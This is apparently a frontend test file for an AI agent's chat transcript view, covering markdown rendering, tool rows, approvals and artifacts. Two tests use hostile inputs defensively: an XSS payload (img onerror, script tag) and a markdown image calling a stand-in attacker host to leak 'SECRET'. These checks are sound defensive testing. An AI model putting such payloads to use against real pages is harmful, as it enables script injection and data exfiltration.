import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import type { Approval, EngineEvent } from "../../api/types";
import { applyEvent, emptyTranscript, type TranscriptState } from "../../state/transcript";
import { Transcript } from "./Transcript";

let n = 0;
const run = (events: [string, Record<string, any>][], start: TranscriptState = emptyTranscript()) =>
  events.reduce((s, [type, payload]) => applyEvent(s, "t1", { seq: ++n, type, payload } as EngineEvent), start);
beforeEach(() => { n = 0; });

const view = (state: TranscriptState, extra: Partial<React.ComponentProps<typeof Transcript>> = {}) =>
  render(<Transcript transcript={state} pending={[]} working={false} onDecide={vi.fn()} deciding={false} {...extra} />);

describe("the conversation", () => {
  it("shows what you said and the assistant's markdown answer", () => {
    view(run([["user_message", { text: "hello" }], ["assistant_message", { message_id: "m1", text: "# Title\n\nSome **bold** text and `code`." }], ["turn_done", { status: "completed" }]]));
    expect(screen.getByText("hello")).toBeInTheDocument();
    expect(screen.getByRole("heading", { name: "Title" })).toBeInTheDocument();
    expect(screen.getByText("bold").tagName).toBe("STRONG");
  });

  it("never renders HTML the assistant (or something it read) put in its answer, and opens links safely", () => {
    view(run([["assistant_message", { message_id: "m1", text: '<img src=x onerror="alert(1)"> <script>bad()</script> [site](https://example.com)' }]]));
    expect(document.querySelector("img")).toBeNull();
    expect(document.querySelector("script")).toBeNull();
    const link = screen.getByRole("link", { name: "site" });
    expect(link).toHaveAttribute("target", "_blank");
    expect(link.getAttribute("rel")).toContain("noopener");
  });

  it("does not fetch images named in an answer (that would leak whatever the address carries); it offers a link instead", () => {
    view(run([["assistant_message", { message_id: "m1", text: "Look: ![a chart](https://evil.example.com/p.png?data=SECRET)" }]]));
    expect(document.querySelector("img")).toBeNull();
    const link = screen.getByRole("link", { name: "a chart" });
    expect(link).toHaveAttribute("href", "https://evil.example.com/p.png?data=SECRET");
    expect(link).toHaveAttribute("target", "_blank");
  });

  it("marks text that is still arriving", () => {
    const { container } = view(run([["token", { message_id: "m1", text: "typing" }]]));
    expect(container.querySelector(".caret")).not.toBeNull();
  });

  it("shows a working indicator until text starts to arrive", () => {
    const state = run([["user_message", { text: "go" }]]);
    const { rerender } = view(state, { working: true });
    expect(screen.getByText("Working…")).toBeInTheDocument();
    rerender(<Transcript transcript={run([["token", { message_id: "m1", text: "hi" }]], state)} pending={[]} working onDecide={vi.fn()} deciding={false} />);
    expect(screen.queryByText("Working…")).not.toBeInTheDocument();
  });

  it("tells you which models were used and how much", () => {
    view(run([["assistant_message", { message_id: "m1", text: "done" }], ["usage", { input_tokens: 9000, output_tokens: 1500, model: "gemini-2.5-flash" }], ["usage", { input_tokens: 10, output_tokens: 10, model: "gemini-2.5-flash-lite" }]]));
    expect(screen.getByText("gemini-2.5-flash · gemini-2.5-flash-lite · 10.5k tokens · 2 model calls")).toBeInTheDocument();
  });
});

describe("what the assistant did", () => {
  it("shows a tool as a short row that opens to its input and result", async () => {
    const user = userEvent.setup();
    view(run([["tool_call", { tool_call_id: "c1", name: "execute", args: { command: "ls -la" } }], ["tool_result", { tool_call_id: "c1", status: "success", preview: "a.txt\nb.txt" }]]));
    const row = screen.getByRole("button", { name: /Ran a command/ });
    expect(row).toHaveAttribute("aria-expanded", "false");
    expect(screen.queryByText(/a\.txt/)).not.toBeInTheDocument();
    await user.click(row);
    expect(screen.getByText("ls -la", { selector: "pre" })).toBeInTheDocument();
    expect(screen.getByText(/a\.txt/)).toBeInTheDocument();
  });

  it("does not show the plumbing: the progress list, plans and questions have their own places", () => {
    view(run([["tool_call", { tool_call_id: "a", name: "write_todos", args: {} }], ["tool_call", { tool_call_id: "b", name: "ask_user", args: {} }], ["tool_call", { tool_call_id: "c", name: "submit_plan", args: {} }]]));
    expect(screen.queryByRole("button")).not.toBeInTheDocument();
  });

  it("shows a helper's steps in a block that names the helper and the model it ran on, and can be folded away", async () => {
    const user = userEvent.setup();
    view(run([
      ["tool_call", { tool_call_id: "d1", name: "delegate", args: { subagent_type: "researcher", description: "look it up", model: "gemini-2.5-flash-lite" } }],
      ["usage", { agent: "researcher", ns: "tools:1", model: "gemini-2.5-flash-lite", input_tokens: 1, output_tokens: 1 }],
      ["tool_call", { tool_call_id: "w1", name: "web_search", args: { query: "apple revenue" }, agent: "researcher", ns: "tools:1" }],
      ["assistant_message", { message_id: "h1", text: "Revenue was big.", agent: "researcher", ns: "tools:1" }],
    ]));
    const block = screen.getByRole("button", { name: /^researcher/i });
    expect(block).toHaveTextContent("gemini-2.5-flash-lite");
    expect(screen.getByText("Revenue was big.")).toBeInTheDocument();
    expect(screen.getByText(/Searched the web/)).toBeInTheDocument();
    await user.click(block);
    expect(screen.queryByText("Revenue was big.")).not.toBeInTheDocument();
  });

  it("lists saved files as downloads", () => {
    view(run([["artifact", { artifact_id: "a1", name: "report.md", path: "report.md", size: 2048, content_type: "text/markdown" }], ["artifact", { artifact_id: "a2", name: "data.csv", path: "out/data.csv", size: 12 }]]));
    const link = screen.getByRole("link", { name: /report\.md/ });
    expect(link).toHaveAttribute("href", "/api/artifacts/a1/content");
    expect(screen.getByText("2.0 KB")).toBeInTheDocument();
    expect(screen.getAllByRole("link")).toHaveLength(2);
  });

  it("explains a stopped, failed or blocked turn", () => {
    const { rerender } = view(run([["turn_done", { status: "cancelled" }]]));
    expect(screen.getByText("You stopped this.")).toBeInTheDocument();
    n = 0;
    rerender(<Transcript transcript={run([["turn_error", { status: "failed", error: "model timeout" }]])} pending={[]} working={false} onDecide={vi.fn()} deciding={false} />);
    expect(screen.getByText("model timeout")).toBeInTheDocument();
    n = 0;
    rerender(<Transcript transcript={run([["turn_error", { status: "blocked", error: "that looks like an attack" }]])} pending={[]} working={false} onDecide={vi.fn()} deciding={false} />);
    expect(screen.getByText("that looks like an attack")).toBeInTheDocument();
  });
});

describe("approvals in the conversation", () => {
  const items = [{ tool: "execute", kind: "shell", title: "Run a shell command", allowed_decisions: ["approve", "reject"], preview: { command: "make" } }];
  const pending: Approval = { id: "a1", run_id: "t1", status: "pending", expires_at: "", decided_by: null, previews: items as any, action_requests: [{ name: "execute", args: { command: "make" } }] };

  it("shows the live request as a card that can be answered, using the full record", async () => {
    const onDecide = vi.fn();
    const user = userEvent.setup();
    view(run([["interrupt", { approval_id: "a1", items }]]), { pending: [pending], onDecide });
    const card = screen.getByRole("region", { name: "Waiting for your decision" });
    await user.click(within(card).getByRole("button", { name: /Approve/ }));
    expect(onDecide).toHaveBeenCalledWith("a1", [{ type: "approve" }]);
  });

  it("shows a decided request as a short row, and an automatic one as such", () => {
    view(run([["interrupt", { approval_id: "a1", items }], ["approval_decided", { approval_id: "a1", status: "approved", decisions: [{ type: "approve" }] }], ["approval_auto", { approval_id: "a2", items }]]));
    expect(screen.getByText("Approved")).toBeInTheDocument();
    expect(screen.getByText("Approved automatically")).toBeInTheDocument();
  });
});
